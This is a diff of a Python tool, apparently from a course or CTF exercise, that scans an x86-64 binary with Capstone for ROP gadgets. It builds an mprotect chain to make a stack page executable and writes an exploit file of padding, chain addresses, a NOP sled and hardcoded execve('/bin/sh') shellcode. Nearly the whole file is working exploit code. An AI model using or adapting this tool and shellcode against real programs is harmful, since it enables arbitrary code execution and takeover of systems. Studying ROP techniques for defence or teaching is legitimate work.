@@ -3,7 +3,6 @@ import collections
 import pprint
 import re
 import struct
-import platform
 from capstone import *
 from capstone.x86 import *
 
@@ -11,27 +10,25 @@ MAX_GADGET_LEN = 6
 MAX_GADGETS = 10000
 MAX_INSTRUCTION_LEN = 10
 MAX_SCANS = 6
-GADGET_TYPES = ["ret", "int"]
+GADGET_TYPES = ["ret"]
 BINARY_RET = "0xc3"
 JUNK = 0x41 #"A"
+PAGE_SIZE = 4096
 FILTER_INSTR = ["enter", "leave", "push", ".byte", "call"]
-PADDING = "AAAAAAAAAAAAAAAAAAAAAAAA"
-LIBC = 0x7ffff7a0e000
 #we need gadgets to set these regs, and one to call syscall
 REQUIRED_GADGETS = ["rax", "rdi", "rsi", "rdx"]
-SHELLCODE_ADDR = 0x7fffffffe49f
-NOP = "\x90"
-SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
-MPROTECT_ARGS = {"rax": 10, "rdi": 0x7fffffffe000, "rsi": 4096, "rdx": 4} #rdi should be address of shellcode
+MPROTECT_ARGS = {"rax": 10, "rdi": None, "rsi": PAGE_SIZE, "rdx": 7} #rdi should be address of shellcode
 
 class GadgetList:
-    def __init__(self, logfile):
+    def __init__(self, shellcode_address, logfile):
         self.set = set()
         self.gadgets = dict()
         self.size = 0
         self.out = logfile
         self.useful_gadgets = dict()
         self.popret = dict()
+        MPROTECT_ARGS["rdi"] = self.getLastPageAddr(shellcode_address)
+        self.shellcode_address = shellcode_address
         for t in GADGET_TYPES:
             self.gadgets[t] = list()
 
@@ -40,6 +37,10 @@ class GadgetList:
             self.useful_gadgets[g] = list()
         self.useful_gadgets["syscall"] = list()
         self.popret["syscall"] = None
+
+    def getLastPageAddr(self, addr):
+        rem = addr % 4096
+        return addr - rem
 
     def serializeInstructions(self, gadget):
         seq = list()
@@ -104,21 +105,23 @@ class GadgetList:
         if len(required) > 0:
             print("ERROR: Unable to find gadgets for: %s" % required)
 
+        print("ROP Payload:")
         stack = []
-        print("\nDependent Gadgets:")
         for (register, gadget) in chain:
             print(self.getGadgetInfo(gadget))
             stack += self.formatPopArgs(gadget, register)
 
-        print("\nIndependent Gadgets:")
         for (register, gadget) in independent_gadgets.iteritems():
             print(self.getGadgetInfo(gadget))
             stack += self.formatPopArgs(gadget, register)
 
         syscall = self.useful_gadgets["syscall"][0]
         print(self.getGadgetInfo(syscall))
-        stack.append(syscall[0][0] + LIBC)
+        stack.append(syscall[0][0])
+        stack.append(self.shellcode_address)
+        return stack
 
+        '''
         print("\nSTACK:")
         with open("ropchain.txt", "wb") as f:
             f.write(PADDING)
@@ -126,10 +129,10 @@ class GadgetList:
                 print("0x%x" % int(addr))
                 f.write(struct.pack("<Q", int(addr)))
             f.write(struct.pack("<Q", SHELLCODE_ADDR))
-            nopsled = NOP * 25
+            nopsled = NOP * 22
             f.write(nopsled)
             f.write(SHELLCODE)
-
+        '''
 
     def formatPopArgs(self, gadget, register):
         if register not in MPROTECT_ARGS:
@@ -137,7 +140,7 @@ class GadgetList:
             sys.exit(1)
 
         stack = []
-        stack.append(gadget[0][0] + LIBC) #address
+        stack.append(gadget[0][0]) #address
         stack.append(MPROTECT_ARGS[register])
         for g in gadget[1:]:
             if g[1] == "pop":
@@ -151,7 +154,7 @@ class GadgetList:
             for a in arr:
                 reg = a.strip(" ")
                 if reg in REQUIRED_GADGETS and reg not in independent_gadgets:
-                    print("Conflicting Reg %s" % reg)
+                    #print("Conflicting Reg %s" % reg)
                     res.append(reg)
         return res
 
@@ -215,21 +218,10 @@ class GadgetList:
                 return
 
             if i[1] == "xor" and i[2].lower() == "rax, rax" and len(g) == 2:
-                self.useful_gadgets["rax"].append(g)
-                self.set.add(seq)
-                #print("[*] Found xor Gadget (%s)" % info)
-                return
-
-            if i[1] == "add" and len(g) == 2:
-                if i[2].lower() == "rax, 1" or i[2].lower() == "al, 1":
                     self.useful_gadgets["rax"].append(g)
                     self.set.add(seq)
                     #print("[*] Found add Gadget (%s)" % info)
                     return
-
-            if i[1] == "mov" and "rax," in i[2].lower() and len(g) == 2:
-                self.useful_gadgets["rax"].append(g)
-                self.set.add(seq)
 
     def logGadget(self, gadget):
         s = self.getGadgetInfo(gadget)
@@ -262,32 +254,25 @@ class GadgetList:
         return True
 
 class GadgetScanner:
-    def __init__(self, d, glist):
-        self.data = d
+    def __init__(self, glist):
         self.gadgetList = glist
 
     def initScanner(self):
-        arch = None
-        if platform.architecture()[0] == "32bit":
-            arch = CS_MODE_32
-        elif platform.architecture()[0] == "64bit":
-            arch = CS_MODE_64
-        else:
-            print("Cannot find platform architecture")
-            sys.exit(1)
-
-        md = Cs(CS_ARCH_X86, arch)
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
         md.skipdata = True
         return md
 
-    def instructionScan(self, data, instruction): #"0xc3"
+    def instructionScan(self, binary, baseAddress): #"0xc3"
+        with open(binary, "rb") as f:
+            data = f.read()
+
         hex_data =  " ".join(hex(ord(n)) for n in data)
         #inds = [m.start() for m in re.finditer("0xc3", hex_data)]
 
         inds = []
         arr = hex_data.split(" ")
         for i in range(0, len(arr)):
-            if arr[i] == instruction:
+            if arr[i] == BINARY_RET:
                 inds.append(i)
 
         #blob = MAX_INSTRUCTION_LEN * MAX_GADGET_LEN
@@ -297,14 +282,14 @@ class GadgetScanner:
             start = i - blob
             offsets.append((start, i+1))
 
-        print("%d ret instructions found" % len(inds))
+        #print("%d ret instructions found" % len(inds))
         for tup in offsets:
             start = tup[0]
             end = tup[1]
             if start < 0:
                 continue
             #print("scanning %d->%d" % (start, end))
-            self.scanSection(data[start:end], start)
+            self.scanSection(data[start:end], start + baseAddress)
             if self.gadgetList.isReady():
                 return
 
@@ -319,13 +304,14 @@ class GadgetScanner:
             instr = md.disasm_lite(data, 0)
             self.handleInstructions(instr, offset + start)
             start -= 2
-
+    '''
     def linearScan(self, data, offset=0):
         count = 0
         #md.detail = True
         md = self.initScanner()
         instructions = md.disasm_lite(data, offset)
         self.handleInstructions(instructions)
+    '''
 
     def handleInstructions(self, instructions, offset=0):
         gadget = collections.deque([None]*MAX_GADGET_LEN, MAX_GADGET_LEN)
@@ -340,34 +326,37 @@ class GadgetScanner:
             #print("0x%x:\t%s\t%s [%d]" % (i[0], i[1], i[2], i.id))
             if i[1] in GADGET_TYPES:
                 #print("\t[*] Found %s" % self.gadgetList.getGadgetInfo(gadget))
-                if i[1] == "int" and i[2] == "0x80":
-                    self.gadgetList.addGadget(gadget,i[1])
-                elif "0x" not in i[2]: #dont want call to have certain args
+                if "0x" not in i[2]: #dont want call to have certain args
                     self.gadgetList.addGadget(gadget,i[1])
                 gadget = collections.deque([None]*MAX_GADGET_LEN, MAX_GADGET_LEN) #reset
 
 def main():
-
-    if len(sys.argv) < 2:
+    if len(sys.argv) < 4:
         print("Not enough arguments")
-        print("Usage: ropscan [binary]")
+        print("Usage: ropscan [binary] [binary base address] [shellcode address]")
         return 1
 
-    if (len(sys.argv) > 2):
-        logfile = open(sys.argv[2] + "_gadgets.txt", "w")
-    else:
-        logfile = open("gadgets.txt", "w")
-    with open(sys.argv[1], "rb") as f:
-        data = f.read()
+    logfile = open("gadgets.txt", "w")
+    binary = sys.argv[1]
+    binary_baseaddr = sys.argv[2]
+    shellcode_address = sys.argv[3]
 
-    gadgetList = GadgetList(logfile)
-    gadgetScanner = GadgetScanner(data, gadgetList);
-    gadgetScanner.instructionScan(data, BINARY_RET)
-    print("\nROP CHAIN:")
-    gadgetList.createROPChain()
+    gadgetList = GadgetList(int(shellcode_address, 16), logfile)
+    gadgetScanner = GadgetScanner(gadgetList)
+    gadgetScanner.instructionScan(binary, int(binary_baseaddr, 16))
+    stack = gadgetList.createROPChain()
 
-    print("\nFound %d Unique Gadgets" % gadgetList.size)
+    with open("in.txt", "wb") as f:
+        f.write("A"*24)
+        for addr in stack:
+            f.write(struct.pack("<Q", int(addr)))
+        f.write("\x90"*20)
+        #f.write("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
+        f.write("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
+        #f.write("\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")
     return 0
 
 if __name__ == '__main__':
     sys.exit(main())
+
+
